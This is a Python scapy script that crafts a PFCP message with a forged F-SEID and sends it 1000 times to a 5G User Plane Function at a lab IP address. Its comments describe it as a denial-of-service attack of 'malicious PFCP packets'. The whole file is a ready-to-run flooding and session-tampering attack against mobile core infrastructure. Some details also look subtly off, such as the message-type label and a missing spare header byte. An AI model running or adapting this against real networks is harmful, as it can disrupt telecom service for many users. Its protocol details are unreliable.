#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.inet import IP, UDP
import socket
import struct

# UPF (User Plane Function) details
UPF_IP = "192.168.56.113"  
UPF_PORT = 8805  # Standard PFCP port


message_type = 53  # PFCP Message Type for Session Modification Request
sequence_number = 1
seid = 0x0010000000000000  

# Construct the PFCP header according to the specification
# First byte: Version (3 bits), Spare (1 bit), MP (1 bit), S (1 bit), Spare (2 bits)
version = 1  # PFCP version 1
spare = 0
mp = 0  # Message Priority flag (not used here)
s_flag = 1  # S flag set to 1 to include SEID

# Construct the first byte
byte0 = (version << 5) | (s_flag << 2)
# byte0 = 0b00100100 => 0x24

length = 0  # Will be updated after assembling the message
# SEID: 8 bytes (since S flag is set)
seid_bytes = seid.to_bytes(8, 'big')
# Sequence Number: 3 bytes
sequence_number_bytes = sequence_number.to_bytes(3, 'big')

# Assemble the PFCP header (without length)
pfcp_header = struct.pack('!BBH', byte0, message_type, length) + seid_bytes + sequence_number_bytes

# F-SEID IE
# IE Type: 150 (F-SEID)
ie_type = 150  
# Length of the IE: 13 bytes (1 byte flags + 8 bytes SEID + 4 bytes IPv4 address)
ie_length = 13
# Flags: 0x01 indicates that IPv4 address is present
flags = 0x01

# F-SEID IE Content
fseid_seid = seid.to_bytes(8, 'big')
fseid_ipv4 = socket.inet_aton(UPF_IP)

# Assemble the F-SEID IE
fseid_ie = struct.pack('!HHB', ie_type, ie_length, flags) + fseid_seid + fseid_ipv4

# Assemble the complete PFCP message
pfcp_message = pfcp_header + fseid_ie

# Update the length field in the PFCP header (excluding the first 4 bytes)
pfcp_message_length = len(pfcp_message) - 4  # Exclude Version, Message Type, and Length fields
# Update the length field in the header
pfcp_header_with_length = struct.pack('!BBH', byte0, message_type, pfcp_message_length) + seid_bytes + sequence_number_bytes

# Combine the PFCP header with the IEs to create the final message
pfcp_message = pfcp_header_with_length + fseid_ie

# Encapsulate the PFCP message in UDP and IP headers
packet = IP(dst=UPF_IP) / UDP(sport=RandShort(), dport=UPF_PORT) / Raw(load=pfcp_message)

packet[UDP].chksum = None

# Debugging: Print the final packet summary
print(f"Packet Summary: {packet.summary()}")

# Optional: Show packet hexdump for verification
hexdump(packet)

# Send PFCP packets in a loop (for DoS attack simulation)
for _ in range(1000):  # Adjust the number for your testing
    send(packet)
print("Sent 1000 malicious PFCP packets to UPF.")

